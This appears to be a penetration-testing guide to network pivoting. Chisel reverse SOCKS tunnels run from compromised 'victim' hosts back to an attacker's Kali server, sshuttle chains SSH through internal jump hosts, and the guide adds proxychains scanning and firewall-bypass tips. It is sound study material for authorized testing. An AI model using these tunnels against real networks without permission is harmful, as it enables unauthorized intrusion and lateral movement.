# Pivoting-guide
Guide to Pivoting with sshuttle and chisel
## General network diagram for examples
```
Attacker (Kali, 1.1.1.1)
│
└── Hop 1: Web server (10.0.0.5, accessible from the Internet)
 │
 └── Hop 2: Internal host (192.168.1.10, accessible only from 10.0.0.0/24)
  │
  └── Hop 3: Target server (172.16.0.20, accessible only from 192.168.1.0/24)
```
---
# 1. Pivoting via Chisel (SOCKS5 tunnels)

**How ​​it works:**
- **Tunneling via SOCKS5**, similar to SSH, but works as a reverse proxy.
- The client connects to the server and opens **SOCKS5 or ports** to access the inside network.
- Suitable for **bypassing firewalls**, if it uses standard web ports (80, 443).

**Example command:**
On the attacker:
```
chisel server --port 8080 --reverse
```

On the victim:
```
chisel client <SERVER_IP>:8080 R:socks
```
- `R:socks` — creates a SOCKS5 proxy on the server.

**When to use?**
- Need a **fast SOCKS proxy** without complex configuration.
- Traffic should go **via HTTP/HTTPS** (for example, if SSH is blocked).

### **Step 1: Setting up Chisel server on Kali**
**On the attacking machine (1.1.1.1)**
```
chisel server -v --port 8080 --reverse --auth user:pass
```
- `--reverse`: allow reverse connections
- `--auth`: creds for authentication
- `-v`: verbose mode for debugging

### **Step 2: First hop (Kali → Web server)**
**On the web server (10.0.0.5)**:
```
./chisel client -v --auth user:pass 1.1.1.1:8080 R:1080:socks
```
- `R:1080:socks`: create a SOCKS5 proxy on port 1080 Kali, connecting to the chisel server on port 8080.

**Checking:**
```
curl --socks5-hostname 127.0.0.1:1080 socks5://10.0.0.5
```

### **Step 3: Second Hop (Web Server → Internal Host)**
**On the internal host (192.168.1.10)**:
Via the first hop SOCKS proxy (10.0.0.5:1080)
```
./chisel client -v --auth user:pass --proxy socks5://10.0.0.5:1080 1.1.1.1:8080 R:1081:socks
```
- `--proxy`: use the first hop proxy
- `R:1081:socks`: new port 1081 on Kali for 2nd hop

**Check:**
```
curl --socks5-hostname 127.0.0.1:1081 socks5://192.168.1.10
```

### **Step 4: Third Hop (Internal Host → Target Server)**
**On Target Server (172.16.0.20)**:
```
./chisel client -v --auth user:pass --proxy socks5://192.168.1.10:1081 1.1.1.1:8080 R:1082:socks
```
- `R:1082:socks`: port 1082 on Kali for 3rd hop

### Result:
- via `127.0.0.1:1082` network 172.16.0.0/24 is available on Kali
- via `127.0.0.1:1081` network 192.168.1.0/24 is available on Kali
- via `127.0.0.1:1080` network 10.0.0.0/24 is available on Kali
---
# 2. Pivoting via SSHuttle (SSH-VPN)

**How ​​it works:**
- **"VPN over SSH"** — routes traffic through an SSH tunnel without configuring a VPN.
- Automatically **forwards subnets** through the specified SSH server.
- Does not require rights on the remote machine (unlike a full-fledged VPN).

**Example command:**
```
sshuttle -r user@jump-server 192.168.1.0/24
```
- `-r` — SSH server to jump to.
- `192.168.1.0/24` — subnet that will go through the tunnel.

**When to use?**
- You need **transparent access** to the internal network (like a VPN, but simpler).
- Already have **SSH access** to the jump server.

### **Step 1: First Hop (Kali → Web Server)**
**Kali Command:**
```
sshuttle -r user@10.0.0.5 10.0.0.0/24 -e "ssh -i ~/.ssh/jump1_key"
```
- `-r user@10.0.0.5`: SSH connection to the first hop.
- `10.0.0.0/24`: routable subnet.
- `-e`: specifies the SSH command with the key.
**Where executed:**
The command is run on Kali. Traffic for 10.0.0.0/24 goes through the Web Server.

### **Step 2: Second Hop (Web Server → Internal Host)**
**Kali Command:**
```
sshuttle -r user@192.168.1.10 192.168.1.0/24 \
--ssh-cmd "ssh -i ~/.ssh/jump2_key -J user@10.0.0.5"
```
- `-J user@10.0.0.5`: jump via first host (SSH ProxyJump).
- `192.168.1.0/24`: second hop routable subnet.
**Where executed:**
Command is run on Kali. Traffic for 192.168.1.0/24 goes via Internal Host.

### **Step 3: Third Hop (Internal Host → Target Server)**
**Kali Command:**
```
sshuttle -r user@172.16.0.20 172.16.0.0/24 \
  --ssh-cmd "ssh -i ~/.ssh/target_key -J user@10.0.0.5,user@192.168.1.10"
```
- `-J user@192.168.1.10`: Hop via the second host.
- `172.16.0.0/24`: The final target subnet.

**Result:**
All traffic for 172.16.0.0/24 goes through the chain: Kali → Web Server → Internal Host → Target Server.

---
## Possible problems and solutions

### 1. **Problem: No route to target network**
**Symptoms:**
`No route to host`, packets are lost after the first hop.
**Solution:**
Add a static route on Kali:
```
sudo ip route add 172.16.0.0/24 via 10.0.0.5
```

Or use `proxychains`:
```
proxychains nmap -sT -p 22,80,443 172.16.0.20
```

### 2. **Problem: SSH ports are blocked**
**Symptoms:**
Timeouts when connecting to port 22.
**Workaround:**
Use port 443 for SSH:
```
sshuttle -r user@10.0.0.5:443 10.0.0.0/24
```

Or set up an SSH server to hop to non-standard ports.

### 3. **Problem: Authentication errors**
**Symptoms:**
`Permission denied (publickey)` or `Auth failed`.
**SSH solution:**
- Make sure keys are added to `authorized_keys` on each hop:
```
ssh-copy-id -i ~/.ssh/jump1_key user@10.0.0.5
```
- For Gost, use authentication parameters:
```
gost -L "socks5://user:pass@:1080"
```
### 4. **Problem: Unstable connections**
**Symptoms:**
Tunnels drop after a few minutes.
**Solution:**
- For Chisel use `--keepalive`:
```
chisel client --keepalive 30s ...
```
---
## Debugging checklist
1. **Check connectivity:**
Via Chisel
```
proxychains curl http://172.16.0.20
```
Via SSHuttle
```
traceroute -T 172.16.0.20
```
2. **Analyze logs:**
- For Chisel: add `-v` to commands.

---

# **Automation:**
Create bash scripts for quick chain deployment:
# Chisel example
```
#!/bin/bash
chisel server --port 8080 --reverse &
sleep 2
ssh user@10.0.0.5 "./chisel client 1.1.1.1:8080 R:socks"
```
---

## Conclusion

Each tool has its own strengths:

- **Chisel** — simplicity and speed.

- **SSHuttle** — SSH integration and automatic routing.

